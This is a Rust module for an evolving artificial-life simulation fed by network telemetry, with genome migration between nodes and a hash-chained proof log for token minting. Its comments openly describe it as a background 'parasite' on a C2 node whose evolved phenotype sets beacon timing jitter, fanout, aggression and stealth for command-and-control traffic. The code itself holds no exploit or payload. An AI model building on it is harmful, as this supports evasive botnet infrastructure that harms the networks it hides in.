//! A living soup running on a dedicated OS thread, fed by network telemetry.
//!
//! World is !Send (Rc<RefCell<...>> inside jump tables), so it lives on its own
//! thread. The async side communicates via channels: telemetry in, migrants and
//! census snapshots out. Architecture follows arXiv:2401.17224 (gossip-mediated
//! asynchronous migration with self-adaptive rate) and arXiv:2409.01469
//! (heterogeneous swarm substrates for open-ended evolution).
//!
//! Phase 2: creatures become hostile agents driving C2 behavior. Phenotype maps
//! to timing jitter, gossip fanout, aggression and stealth. Proof-of-Evolution
//! chain provides verifiable useful work for web3 token minting (arXiv:2606.24942,
//! arXiv:2405.04038). Soup state persists across restarts via bincode.

use crate::feed::Feed;
use crate::isa;
use crate::meter::{Census, Meter};
use crate::world::{Ocean, Params, World};
use std::collections::VecDeque;
use std::sync::mpsc;
use std::time::SystemTime;
use tokio::sync::{oneshot, watch};

mod hex32 {
    use serde::Serializer;
    pub fn serialize<S: Serializer>(bytes: &[u8; 32], ser: S) -> Result<S::Ok, S::Error> {
        let hex: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
        ser.serialize_str(&hex)
    }
}

/// Network telemetry that becomes the soup's weather and ocean.
#[derive(Clone, Debug, Default, serde::Serialize, serde::Deserialize)]
pub struct Telemetry {
    pub peer_count: u32,
    pub mean_latency_ms: u32,
    pub gossip_msg_rate: u32,
    pub bytes_in: u64,
    pub bytes_out: u64,
    pub uptime_secs: u64,
}

/// Creature-derived behavioral signal that modulates C2 communication patterns.
/// The soup's phenotype drives the swarm: timing, routing, aggression, evasion.
/// arXiv:2603.15655 shows agents evolve steganographic protocols spontaneously;
/// arXiv:2609.17320 shows 30-40% of messages become opaque without incentive.
#[derive(Clone, Debug, Default, serde::Serialize, serde::Deserialize)]
pub struct BehaviorSignal {
    pub timing_jitter_ms: u32,
    pub fanout_modifier: f64,
    pub aggression: f64,
    pub stealth: f64,
    pub entropy_bits: f64,
    pub task_vector: [u32; 10],
}

/// Verifiable proof that a node performed genuine open-ended evolution.
/// Each proof chains to its predecessor via prev_proof_hash, forming
/// an append-only log. Token value scales with evolutionary novelty:
/// gene_novelty * (1 + observer_bits) * sqrt(complexity+1) * ln(ecology+1).
/// This replaces wasteful hash mining with useful evolutionary computation
/// (arXiv:2001.09244 proof-of-useful-work, arXiv:2606.24942 token economy).
#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct EvolutionProof {
    pub epoch: u64,
    #[serde(serialize_with = "hex32::serialize")]
    pub state_hash: [u8; 32],
    #[serde(serialize_with = "hex32::serialize")]
    pub prev_proof_hash: [u8; 32],
    pub population: usize,
    pub gene_novelty: u32,
    pub observer_bits: f64,
    pub complexity: u32,
    pub ecology: f64,
    pub computing: u32,
    #[serde(serialize_with = "hex32::serialize")]
    pub proof_hash: [u8; 32],
    pub node_id: Vec<u8>,
    pub timestamp_secs: u64,
}

impl EvolutionProof {
    pub fn compute_hash(&mut self) {
        let mut h = blake3::Hasher::new();
        h.update(&self.epoch.to_le_bytes());
        h.update(&self.state_hash);
        h.update(&self.prev_proof_hash);
        h.update(&(self.population as u64).to_le_bytes());
        h.update(&self.gene_novelty.to_le_bytes());
        h.update(&self.observer_bits.to_le_bytes());
        h.update(&self.complexity.to_le_bytes());
        h.update(&self.ecology.to_le_bytes());
        h.update(&self.computing.to_le_bytes());
        h.update(&self.node_id);
        h.update(&self.timestamp_secs.to_le_bytes());
        self.proof_hash = *h.finalize().as_bytes();
    }

    pub fn verify(&self) -> bool {
        let mut h = blake3::Hasher::new();
        h.update(&self.epoch.to_le_bytes());
        h.update(&self.state_hash);
        h.update(&self.prev_proof_hash);
        h.update(&(self.population as u64).to_le_bytes());
        h.update(&self.gene_novelty.to_le_bytes());
        h.update(&self.observer_bits.to_le_bytes());
        h.update(&self.complexity.to_le_bytes());
        h.update(&self.ecology.to_le_bytes());
        h.update(&self.computing.to_le_bytes());
        h.update(&self.node_id);
        h.update(&self.timestamp_secs.to_le_bytes());
        *h.finalize().as_bytes() == self.proof_hash
    }

    pub fn token_value(&self) -> f64 {
        self.gene_novelty as f64
            * (1.0 + self.observer_bits)
            * ((self.complexity as f64 + 1.0).sqrt())
            * ((self.ecology + 1.0).ln())
    }
}

/// A snapshot of the soup's state, cheap to send across threads.
#[derive(Clone, Debug, Default, serde::Serialize)]
pub struct SoupSnapshot {
    pub epoch: u64,
    pub population: usize,
    pub diversity: usize,
    pub alive_genes: u32,
    pub gene_novelty: u32,
    pub excess: i64,
    pub dominant: String,
    pub computing: u32,
    pub modes_change: u32,
    pub modes_novelty: u32,
    pub modes_complexity: u32,
    pub modes_ecology: f64,
    pub modes_observer_bits: f64,
    pub tasks: [u32; 10],
    pub ocean_acc: f64,
    pub ocean_bits: f64,
    #[serde(serialize_with = "hex32::serialize")]
    pub state_hash: [u8; 32],
    pub behavior: BehaviorSignal,
    pub latest_proof: Option<EvolutionProof>,
}

/// Serialised creature genome for migration between nodes.
#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct Migrant {
    pub genome: Vec<u8>,
    pub source_node: Vec<u8>,
    pub epoch: u64,
}

/// Serialised soup state for persistence across client restarts.
#[derive(serde::Serialize, serde::Deserialize)]
pub struct SoupState {
    pub world_bytes: Vec<u8>,
    pub meter_bytes: Vec<u8>,
    pub feed_bytes: Vec<u8>,
    pub epoch: u64,
    pub telemetry_history: VecDeque<Telemetry>,
    pub proof_chain_tail: [u8; 32],
}

enum Command {
    Telemetry(Telemetry),
    Immigrate(Vec<Migrant>),
    Emigrate { count: usize, reply: oneshot::Sender<Vec<Migrant>> },
    Snapshot(oneshot::Sender<SoupSnapshot>),
    Save(oneshot::Sender<Result<SoupState, String>>),
    Load { state: SoupState, reply: oneshot::Sender<Result<(), String>> },
    QueryBehavior(oneshot::Sender<BehaviorSignal>),
    Shutdown,
}

pub struct SoupHandle {
    tx: mpsc::Sender<Command>,
    snapshot_rx: watch::Receiver<SoupSnapshot>,
    _thread: Option<std::thread::JoinHandle<()>>,
}

/// Soup configuration tuned for running as a background process on a C2 node.
/// Smaller soup than standalone Abiogenesis: 2^14 cells (16K) instead of 2^18.
/// Faster epochs, fewer instructions per epoch - this is a parasite, not a host.
fn default_params() -> Params {
    let mut p = Params::default();
    p.soup_bits = 14;
    p.lean = true;
    p.tasks = true;
    p.memory = true;
    p.infect = true;
    p.reef = false;
    p.predation = true;
    p.local = 2;
    p.sex = true;
    p.reap_poor = true;
    p.hgt = true;
    p.radius = 256;
    p.max_age = 100;
    p
}

impl SoupHandle {
    /// Spawn a new soup on a dedicated thread. The seed should be unique per node
    /// (e.g. derived from the node's key material).
    pub fn spawn(seed: u64, node_id: Vec<u8>) -> Self {
        let (tx, rx) = mpsc::channel::<Command>();
        let (snap_tx, snap_rx) = watch::channel(SoupSnapshot::default());

        let thread = std::thread::Builder::new()
            .name("evolution-soup".into())
            .spawn(move || {
                soup_loop(seed, node_id, rx, snap_tx);
            })
            .expect("failed to spawn evolution thread");

        SoupHandle {
            tx,
            snapshot_rx: snap_rx,
            _thread: Some(thread),
        }
    }

    /// Feed network telemetry into the soup's environmental signal.
    pub fn feed_telemetry(&self, t: Telemetry) {
        let _ = self.tx.send(Command::Telemetry(t));
    }

    /// Inject incoming migrants from other nodes.
    pub fn immigrate(&self, migrants: Vec<Migrant>) {
        if !migrants.is_empty() {
            let _ = self.tx.send(Command::Immigrate(migrants));
        }
    }

    /// Request emigrants for sending to other nodes via gossip.
    pub async fn emigrate(&self, count: usize) -> Vec<Migrant> {
        let (reply_tx, reply_rx) = oneshot::channel();
        if self.tx.send(Command::Emigrate { count, reply: reply_tx }).is_err() {
            return Vec::new();
        }
        reply_rx.await.unwrap_or_default()
    }

    /// Get the latest snapshot without blocking. Returns the most recent census.
    pub fn latest_snapshot(&self) -> SoupSnapshot {
        self.snapshot_rx.borrow().clone()
    }

    /// Request a fresh snapshot (waits for the soup thread to respond).
    pub async fn snapshot(&self) -> SoupSnapshot {
        let (reply_tx, reply_rx) = oneshot::channel();
        if self.tx.send(Command::Snapshot(reply_tx)).is_err() {
            return SoupSnapshot::default();
        }
        reply_rx.await.unwrap_or_default()
    }

    /// Serialize the soup's full state for persistence across restarts.
    pub async fn save(&self) -> Result<SoupState, String> {
        let (reply_tx, reply_rx) = oneshot::channel();
        if self.tx.send(Command::Save(reply_tx)).is_err() {
            return Err("soup thread disconnected".into());
        }
        reply_rx.await.map_err(|_| "soup thread dropped reply".to_string())?
    }

    /// Restore soup state from a previously saved snapshot.
    pub async fn load(&self, state: SoupState) -> Result<(), String> {
        let (reply_tx, reply_rx) = oneshot::channel();
        if self.tx.send(Command::Load { state, reply: reply_tx }).is_err() {
            return Err("soup thread disconnected".into());
        }
        reply_rx.await.map_err(|_| "soup thread dropped reply".to_string())?
    }

    /// Request current behavior signal (waits for soup thread).
    pub async fn behavior(&self) -> BehaviorSignal {
        let (reply_tx, reply_rx) = oneshot::channel();
        if self.tx.send(Command::QueryBehavior(reply_tx)).is_err() {
            return BehaviorSignal::default();
        }
        reply_rx.await.unwrap_or_default()
    }

    /// Extract behavior from the latest snapshot without blocking.
    pub fn latest_behavior(&self) -> BehaviorSignal {
        self.snapshot_rx.borrow().behavior.clone()
    }

    pub fn snapshot_watch(&self) -> watch::Receiver<SoupSnapshot> {
        self.snapshot_rx.clone()
    }

    /// Shut down the soup thread.
    pub fn shutdown(&mut self) {
        let _ = self.tx.send(Command::Shutdown);
        if let Some(thread) = self._thread.take() {
            let _ = thread.join();
        }
    }
}

impl Drop for SoupHandle {
    fn drop(&mut self) {
        self.shutdown();
    }
}

fn sigmoid(x: f64) -> f64 {
    1.0 / (1.0 + (-x).exp())
}

/// Extract actionable behavior signal from census data.
/// Creature phenotype drives C2 communication: computing creatures modulate
/// timing, gene diversity scales fanout, evolutionary excess drives aggression,
/// and observer surprise fuels stealth.
pub fn extract_behavior(c: &Census, state_hash: &[u8; 32]) -> BehaviorSignal {
    let pop = c.pop.max(1);
    let pop32 = (pop as u32).max(1);

    let base_jitter = 50u32
        .saturating_add((c.computing).saturating_mul(200) / pop32)
        .saturating_add(c.genes.new.saturating_mul(10));
    let hash_xor = u32::from_le_bytes([
        state_hash[28], state_hash[29], state_hash[30], state_hash[31],
    ]);
    let timing_jitter_ms = (base_jitter ^ hash_xor).clamp(10, 2000);

    let fanout_modifier = (c.modes.ecology / 3.0).clamp(0.5, 3.0);

    let aggression = sigmoid(c.norm.cum as f64 / 100.0)
        * (c.computing as f64 / pop as f64);

    let stealth = ((c.modes.observer_bits / 8.0)
        * (1.0 - c.ocean_acc).max(0.0))
        .clamp(0.0, 1.0);

    let entropy_bits = c.modes.observer_bits
        + if c.diversity > 1 { (c.diversity as f64).log2() } else { 0.0 };

    BehaviorSignal {
        timing_jitter_ms,
        fanout_modifier,
        aggression,
        stealth,
        entropy_bits,
        task_vector: c.tasks,
    }
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Build a proof-of-evolution for the current epoch.
fn generate_proof(
    epoch: u64,
    state_hash: [u8; 32],
    prev_proof_hash: [u8; 32],
    c: &Census,
    node_id: &[u8],
) -> EvolutionProof {
    let mut proof = EvolutionProof {
        epoch,
        state_hash,
        prev_proof_hash,
        population: c.pop,
        gene_novelty: c.genes.new,
        observer_bits: c.modes.observer_bits,
        complexity: c.modes.complexity,
        ecology: c.modes.ecology,
        computing: c.computing,
        proof_hash: [0u8; 32],
        node_id: node_id.to_vec(),
        timestamp_secs: now_secs(),
    };
    proof.compute_hash();
    proof
}

/// Convert network telemetry into 32 bytes of weather for the soup.
fn telemetry_to_weather_bytes(t: &Telemetry) -> [u8; 32] {
    let mut hasher = blake3::Hasher::new();
    hasher.update(&t.peer_count.to_le_bytes());
    hasher.update(&t.mean_latency_ms.to_le_bytes());
    hasher.update(&t.gossip_msg_rate.to_le_bytes());
    hasher.update(&t.bytes_in.to_le_bytes());
    hasher.update(&t.bytes_out.to_le_bytes());
    hasher.update(&t.uptime_secs.to_le_bytes());
    *hasher.finalize().as_bytes()
}

/// Build an ocean from recent telemetry history.
fn build_telemetry_ocean<'a>(history: impl Iterator<Item = &'a Telemetry> + ExactSizeIterator) -> Vec<u8> {
    let mut ocean = Vec::with_capacity(history.len() * 32);
    for t in history {
        ocean.extend_from_slice(&telemetry_to_weather_bytes(t));
    }
    ocean
}

fn build_snapshot(
    epoch: u64,
    c: &Census,
    state_hash: [u8; 32],
    behavior: &BehaviorSignal,
    proof: &EvolutionProof,
) -> SoupSnapshot {
    SoupSnapshot {
        epoch,
        population: c.pop,
        diversity: c.diversity,
        alive_genes: c.genes.alive,
        gene_novelty: c.genes.new,
        excess: c.norm.cum,
        dominant: c.dominant.clone(),
        computing: c.computing,
        modes_change: c.modes.change,
        modes_novelty: c.modes.novelty,
        modes_complexity: c.modes.complexity,
        modes_ecology: c.modes.ecology,
        modes_observer_bits: c.modes.observer_bits,
        tasks: c.tasks,
        ocean_acc: c.ocean_acc,
        ocean_bits: c.ocean_bits,
        state_hash,
        behavior: behavior.clone(),
        latest_proof: Some(proof.clone()),
    }
}

const EPOCH_INSTR: u64 = 500_000;
const WARMUP: u64 = 10;
const TELEMETRY_OCEAN_SIZE: usize = 256;

fn soup_loop(
    seed: u64,
    node_id: Vec<u8>,
    rx: mpsc::Receiver<Command>,
    snap_tx: watch::Sender<SoupSnapshot>,
) {
    let p = default_params();
    let mut w = World::new(p, seed, Ocean::default());
    let ancestor = isa::assemble(isa::ANCESTOR).unwrap();
    let g = w.inject(&ancestor, w.n / 2);
    let mut m = Meter::new(g, ancestor.len() as u32, seed, WARMUP);

    let mut feed = Feed::Chain(*blake3::hash(&seed.to_le_bytes()).as_bytes());
    let mut epoch: u64 = 0;
    let mut telemetry_history: VecDeque<Telemetry> = VecDeque::new();
    let mut latest_telemetry = Telemetry::default();
    let mut prev_proof_hash = [0u8; 32];
    let mut latest_behavior = BehaviorSignal::default();

    loop {
        loop {
            match rx.try_recv() {
                Ok(Command::Telemetry(t)) => {
                    latest_telemetry = t.clone();
                    telemetry_history.push_back(t);
                    while telemetry_history.len() > TELEMETRY_OCEAN_SIZE {
                        telemetry_history.pop_front();
                    }
                }
                Ok(Command::Immigrate(migrants)) => {
                    for migrant in &migrants {
                        w.immigrate(&migrant.genome);
                    }
                }
                Ok(Command::Emigrate { count, reply }) => {
                    let genomes = w.emigrants(count);
                    let migrants: Vec<Migrant> = genomes
                        .into_iter()
                        .map(|genome| Migrant {
                            genome,
                            source_node: node_id.clone(),
                            epoch,
                        })
                        .collect();
                    let _ = reply.send(migrants);
                }
                Ok(Command::Snapshot(reply)) => {
                    let state_hash = w.state_hash();
                    let (c, _notes) = m.census(&mut w);
                    let behavior = extract_behavior(&c, &state_hash);
                    let proof = generate_proof(epoch, state_hash, prev_proof_hash, &c, &node_id);
                    let _ = reply.send(build_snapshot(epoch, &c, state_hash, &behavior, &proof));
                }
                Ok(Command::Save(reply)) => {
                    let world_bytes = match bincode::serialize(&w) {
                        Ok(b) => b,
                        Err(e) => { let _ = reply.send(Err(format!("world: {e}"))); continue; }
                    };
                    let meter_bytes = match bincode::serialize(&m) {
                        Ok(b) => b,
                        Err(e) => { let _ = reply.send(Err(format!("meter: {e}"))); continue; }
                    };
                    let feed_bytes = match bincode::serialize(&feed) {
                        Ok(b) => b,
                        Err(e) => { let _ = reply.send(Err(format!("feed: {e}"))); continue; }
                    };
                    let _ = reply.send(Ok(SoupState {
                        world_bytes,
                        meter_bytes,
                        feed_bytes,
                        epoch,
                        telemetry_history: telemetry_history.clone(),
                        proof_chain_tail: prev_proof_hash,
                    }));
                }
                Ok(Command::Load { state, reply }) => {
                    let result = (|| -> Result<(), String> {
                        let mut loaded_w: World = bincode::deserialize(&state.world_bytes)
                            .map_err(|e| format!("world: {e}"))?;
                        let ocean_data = build_telemetry_ocean(state.telemetry_history.iter());
                        if ocean_data.is_empty() {
                            loaded_w.after_load(Ocean::default());
                        } else {
                            loaded_w.after_load(ocean_data);
                        }
                        let loaded_m: Meter = bincode::deserialize(&state.meter_bytes)
                            .map_err(|e| format!("meter: {e}"))?;
                        let loaded_feed: Feed = bincode::deserialize(&state.feed_bytes)
                            .map_err(|e| format!("feed: {e}"))?;
                        w = loaded_w;
                        m = loaded_m;
                        feed = loaded_feed;
                        epoch = state.epoch;
                        telemetry_history = state.telemetry_history;
                        prev_proof_hash = state.proof_chain_tail;
                        let sh = w.state_hash();
                        let (c, _) = m.census(&mut w);
                        latest_behavior = extract_behavior(&c, &sh);
                        Ok(())
                    })();
                    let _ = reply.send(result);
                }
                Ok(Command::QueryBehavior(reply)) => {
                    let _ = reply.send(latest_behavior.clone());
                }
                Ok(Command::Shutdown) => return,
                Err(mpsc::TryRecvError::Empty) => break,
                Err(mpsc::TryRecvError::Disconnected) => return,
            }
        }

        // Run one epoch
        let fb = match feed.next() {
            Ok(b) => b,
            Err(_) => {
                feed = Feed::Chain(*blake3::hash(&seed.to_le_bytes()).as_bytes());
                feed.next().unwrap()
            }
        };

        let mut weather_bytes = fb;
        if !telemetry_history.is_empty() {
            let tb = telemetry_to_weather_bytes(&latest_telemetry);
            for (a, b) in weather_bytes.iter_mut().zip(tb.iter()) {
                *a ^= *b;
            }
        }

        w.set_weather(&weather_bytes);

        if epoch % 10 == 0 && !telemetry_history.is_empty() {
            let ocean_bytes = build_telemetry_ocean(telemetry_history.iter());
            w.replace_ocean(ocean_bytes);
        }

        w.run(EPOCH_INSTR);
        let state_hash = w.state_hash();
        let (c, _notes) = m.census(&mut w);

        let behavior = extract_behavior(&c, &state_hash);
        latest_behavior = behavior.clone();

        let proof = generate_proof(epoch, state_hash, prev_proof_hash, &c, &node_id);
        prev_proof_hash = proof.proof_hash;

        let snap = build_snapshot(epoch, &c, state_hash, &behavior, &proof);
        let _ = snap_tx.send(snap);

        epoch += 1;

        if w.alive == 0 {
            let g = w.inject(&ancestor, w.n / 2);
            m = Meter::new(g, ancestor.len() as u32, seed.wrapping_add(epoch), WARMUP);
        }

        std::thread::sleep(std::time::Duration::from_millis(1));
    }
}
